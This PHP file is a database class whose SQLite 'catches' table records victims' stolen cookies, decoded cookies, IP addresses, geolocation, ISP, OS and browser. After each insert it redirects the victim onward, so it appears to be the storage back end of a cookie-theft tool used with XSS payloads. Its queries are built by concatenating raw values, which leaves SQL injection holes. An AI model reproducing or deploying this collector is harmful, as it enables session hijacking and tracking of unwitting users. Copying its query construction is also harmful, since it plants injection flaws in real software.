<?php
class Database {
    private static $_PDO;

    public function __construct() {
		try {
			self::$_PDO = new \PDO("sqlite:" . Config::Get("Database/SQLite"));
			self::$_PDO->exec("CREATE TABLE IF NOT EXISTS catches (id VARCHAR(32), cookie TEXT, decoded_cookie TEXT, ip_address VARCHAR(255), user_agent VARCHAR TEXT, local_hostname VARCHAR (255), hostname VARCHAR (255), city VARCHAR (255), region VARCHAR (255), country VARCHAR (255), latitude VARCHAR (30), longitude VARCHAR (30), service_provider TEXT, timezone VARCHAR (50), location TEXT, client_os VARCHAR(50), client_browser VARCHAR(50), catch_date DATETIME, unique(id))");
		} catch (PDOException $e) {
			Logger::Error("database-connect", $e);
		}
	}

    public static function Connect() {
        ((self::$_PDO === null) ? self::$_PDO = new \PDO("sqlite:" . Config::Get("Database/SQLite")) : null);

        return self::$_PDO;
    }

	public static function Insert(string $Table = null, array $ColumnValueKeyPairs = array()) {
		try {
			$Database = self::Connect();

			if($Database !== null && !empty($ColumnValueKeyPairs)) {
				$SQL = "INSERT INTO `$Table` (";

				$ColumnCount = 0;
				$ColumnsString = "";
				$ValuesString = "";

				foreach($ColumnValueKeyPairs as $Column => $Value) {
					if($ColumnCount < count($ColumnValueKeyPairs) - 1) {
						$ColumnsString .= strtolower($Column) . ", ";
						$ValuesString .= (is_string($Value)) ? "'" . $Value . "', ": ((is_numeric($Value)) ? $Value . ", " : null);
					} else if($ColumnCount === count($ColumnValueKeyPairs) - 1) {
						$ColumnsString .= strtolower($Column) . ") VALUES (";
						$ValuesString .= (is_string($Value)) ? "'" . $Value . "')" : ((is_numeric($Value)) ? $Value . ")" : null);
					}

					$ColumnCount++;
				}

				$SQL = (!empty($ColumnsString) && !empty($ValuesString)) ? "INSERT INTO `$Table` (" . $ColumnsString . $ValuesString : null;

				if($SQL !== null) {
					try {
						self::$_PDO->exec($SQL);
						Redirect::To(Config::Get("PassThrough/Redirect"));
					} catch (PDOException $e) {
						Logger::Error("database-insert", $e);
					}
				}
			}
		} catch (PDOException $e) {
			Logger::Error("database-connect", $e);
		}
	}

	public static function Select(string $Table, array $Where = array(), $Clause = null, array $OrderBy = array()) {
		try {
			$SQL = null;
			$Database = self::Connect();

			if($Database !== null) {
				if(!empty($Where) && is_array($Where)) {
					$SQL = "SELECT * FROM $Table WHERE ";

					$WherePackCount = 0;
					foreach($Where as $WherePack) {
						if($WherePackCount < count($Where) - 1 && (is_array($WherePack) && count($WherePack) === 3)) {
							$Column = $WherePack[0];
							$Operator = $WherePack[1];
							$Value = $WherePack[2];

							$SQL .= (is_string($Value)) ? "{$Column} {$Operator}'{$Value}' {$Clause} " : ((is_numeric($Value)) ? "{$Column} {$Operator} {$Value} {$Clause} ": "");
						} else if($WherePackCount === count($Where) - 1 && (is_array($WherePack) && count($WherePack) === 3)) {
							$Column = $WherePack[0];
							$Operator = $WherePack[1];
							$Value = $WherePack[2];

							$SQL .= (is_string($Value)) ? $Column . " " . $Operator . "'" . $Value . "'" : ((is_numeric($Value)) ? "{$Column} {$Operator} {$Value}" : "");

							if(!empty($OrderBy)) {
								$SQL .= (isset($OrderBy["order_by"]) && isset($OrderBy["order"])) ? " ORDER BY " . $OrderBy["order_by"] . " " . $OrderBy["order"] : "";
							}
						}

						$WherePackCount++;
					}
				} else {
					$SQL = "SELECT * FROM $Table";
				}

				try {
					$Query = $Database->query($SQL);

					$ReturnableRows = [];
					while ($Row = $Query->fetch(\PDO::FETCH_OBJ)) {
						if(strtolower($Table) === "catches") {
							$ReturnableRows[] = array(
								"id" => $Row->id,
								"cookie" => $Row->cookie,
								"decoded_cookie" => $Row->decoded_cookie,
								"ip_address" => $Row->ip_address,
								"user_agent" => $Row->user_agent,
								"local_hostname" => $Row->local_hostname, 
								"hostname" => $Row->hostname,
								"city" => $Row->city,
								"region" => $Row->region,
								"country" => $Row->country,
								"latitude" => $Row->latitude,
								"longitude" => $Row->longitude,
								"service_provider" => $Row->service_provider,
								"timezone" => $Row->timezone,
								"location" => $Row->location,
								"client_os" => $Row->client_os,
								"client_browser" => $Row->client_browser,
								"catch_date" => $Row->catch_date
							);
						}
					}

					return $ReturnableRows;
				} catch(PDOException $e) {
					Logger::Error("database-select", $e);
				}
			}
		} catch (PDOException $e) {
			Logger::Error("database-connect", $e);
		}
    }
}
?>